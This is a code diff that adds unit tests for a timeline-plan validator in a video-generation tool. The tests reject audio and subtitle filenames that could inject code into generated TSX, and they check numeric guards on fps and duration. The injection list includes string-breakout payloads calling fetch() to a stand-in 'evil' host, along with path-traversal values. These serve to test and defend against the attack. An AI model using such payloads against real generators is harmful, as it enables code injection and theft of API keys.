@@ -362,3 +362,144 @@ describe("resolveTimelineRevision (optimistic lock)", () => {
     expect(resolveTimelineRevision(1, -1).ok).toBe(false);
   });
 });
+
+// ─── 10. audio / subtitle file references (R1 injection guard) ────────────
+// generate-composition.ts interpolates these UNESCAPED into double-quoted
+// string literals in the generated TSX. Without the new validator they'd
+// let a crafted timeline.json inject arbitrary TSX (and exfiltrate
+// ANTHROPIC_API_KEY). The validator must reject anything that isn't a
+// plain filename — and, when a media listing is supplied, must also
+// require the file to exist there.
+
+describe("audio / subtitle file references", () => {
+  test("plain existing filenames pass", () => {
+    const raw = plan({
+      audio: { voiceFile: "audio.mp3", musicFile: "music.mp3", includeVoice: true, includeMusic: true },
+      subtitles: { file: "subtitles.srt", includeCaptions: true },
+    });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  // Code-injection vectors: anything that can break out of a JS double-
+  // quoted string literal must be rejected, even WITHOUT a media listing
+  // (the validator is the only guard when no listing is passed).
+  const injections = [
+    'audio.mp3"); fetch("https://evil/',
+    'audio.mp3\\");fetch("evil',
+    "audio.mp3`); fetch(`evil",
+    'audio\n.mp3',
+    'audio\r.mp3',
+    'audio\t.mp3',
+    "../media/audio.mp3",
+    "/abs/audio.mp3",
+  ];
+  for (const name of injections) {
+    test(`injection in audio.voiceFile "${JSON.stringify(name).slice(0, 40)}" is rejected without listing`, () => {
+      const raw = plan({ audio: { voiceFile: name, includeVoice: true } });
+      const r = validateTimelinePlan(raw);
+      expect(r.ok).toBe(false);
+      if (!r.ok) expect(r.error).toContain("voiceFile");
+    });
+    test(`injection in subtitles.file "${JSON.stringify(name).slice(0, 40)}" is rejected without listing`, () => {
+      const raw = plan({ subtitles: { file: name, includeCaptions: true } });
+      const r = validateTimelinePlan(raw);
+      expect(r.ok).toBe(false);
+      if (!r.ok) expect(r.error).toContain("subtitles.file");
+    });
+  }
+
+  test("voiceFile not in listing is rejected (includeVoice true)", () => {
+    const raw = plan({ audio: { voiceFile: "ghost.mp3", includeVoice: true } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(false);
+  });
+
+  test("voiceFile not in listing PASSES when includeVoice false (disabled track)", () => {
+    const raw = plan({ audio: { voiceFile: "ghost.mp3", includeVoice: false } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  test("musicFile not in listing is rejected (includeMusic true)", () => {
+    const raw = plan({ audio: { musicFile: "ghost.mp3", includeMusic: true } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(false);
+  });
+
+  test("musicFile not in listing PASSES when includeMusic false (disabled track)", () => {
+    const raw = plan({ audio: { musicFile: "ghost.mp3", includeMusic: false } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  test("subtitles.file not in listing is rejected (includeCaptions true)", () => {
+    const raw = plan({ subtitles: { file: "ghost.srt", includeCaptions: true } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(false);
+  });
+
+  test("subtitles.file not in listing PASSES when includeCaptions false", () => {
+    const raw = plan({ subtitles: { file: "ghost.srt", includeCaptions: false } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  // Missing fields default to safe generator defaults (audio.mp3 etc).
+  test("missing audio.voiceFile passes (generator defaults to audio.mp3)", () => {
+    const raw = plan({ audio: { includeVoice: true } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  test("missing subtitles.file passes (generator defaults to subtitles.srt)", () => {
+    const raw = plan({ subtitles: { includeCaptions: true } });
+    expect(validateTimelinePlan(raw, MEDIA).ok).toBe(true);
+  });
+
+  test("no audio at all passes", () => {
+    const raw = JSON.parse(plan());
+    delete raw.audio;
+    expect(validateTimelinePlan(JSON.stringify(raw), MEDIA).ok).toBe(true);
+  });
+
+  test("no subtitles at all passes", () => {
+    const raw = JSON.parse(plan());
+    delete raw.subtitles;
+    expect(validateTimelinePlan(JSON.stringify(raw), MEDIA).ok).toBe(true);
+  });
+});
+
+// ─── 11. fps / durationInFrames numeric guard ────────────────────────────
+// generate-composition.ts interpolates these RAW into generated code; a
+// non-number (or non-positive) would either crash the generator or produce
+// broken output.
+
+describe("fps / durationInFrames numeric guard", () => {
+  test("missing fps is rejected", () => {
+    const raw = JSON.parse(plan());
+    delete raw.fps;
+    expect(validateTimelinePlan(JSON.stringify(raw)).ok).toBe(false);
+  });
+  test("non-numeric fps is rejected", () => {
+    const raw = plan({ fps: "thirty" });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+  test("zero fps is rejected", () => {
+    const raw = plan({ fps: 0 });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+  test("negative fps is rejected", () => {
+    const raw = plan({ fps: -30 });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+  test("missing durationInFrames is rejected", () => {
+    const raw = JSON.parse(plan());
+    delete raw.durationInFrames;
+    expect(validateTimelinePlan(JSON.stringify(raw)).ok).toBe(false);
+  });
+  test("non-numeric durationInFrames is rejected", () => {
+    const raw = plan({ durationInFrames: "abc" });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+  test("zero durationInFrames is rejected", () => {
+    const raw = plan({ durationInFrames: 0 });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+  test("negative durationInFrames is rejected", () => {
+    const raw = plan({ durationInFrames: -1 });
+    expect(validateTimelinePlan(raw).ok).toBe(false);
+  });
+});
